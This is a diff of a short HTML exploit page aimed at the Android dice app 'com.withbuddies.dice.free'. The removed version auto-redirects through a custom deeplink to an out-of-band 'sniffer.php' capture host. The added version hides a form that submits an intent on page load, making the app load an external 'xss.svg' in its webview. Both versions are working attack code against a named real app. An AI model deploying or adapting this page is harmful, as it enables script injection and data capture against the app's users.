@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deeplink Auto-Submit PoC</title>
+    <title>Deeplink Exploit</title>
 </head>
 <body>
-    <h1>Deeplink Auto-Submit Proof of Concept</h1>
-    <p>If the app supports the Deeplink, it will automatically open when this page loads.</p>
+    <!-- Hidden Form to Auto Submit the Intent -->
+    <form id="exploitForm" action="intent://ya3raj.github.io/bhuwanportfolio/xss.svg#Intent;scheme=https;package=com.withbuddies.dice.free;end;" method="get">
+    </form>
+
     <script>
-        // Auto-submit the Deeplink
-        window.onload = function() {
-            window.location.href = "withbuddiesdice://launch/DiceUnityActivity?url=https://kkoqokcuwrviqficvqdei1kryu8d27i10.oast.fun/sniffer.php&navigation_bar_type=transparent";
-        };
+        // Automatically submit the form on page load
+        document.getElementById("exploitForm").submit();
     </script>
 </body>
 </html>
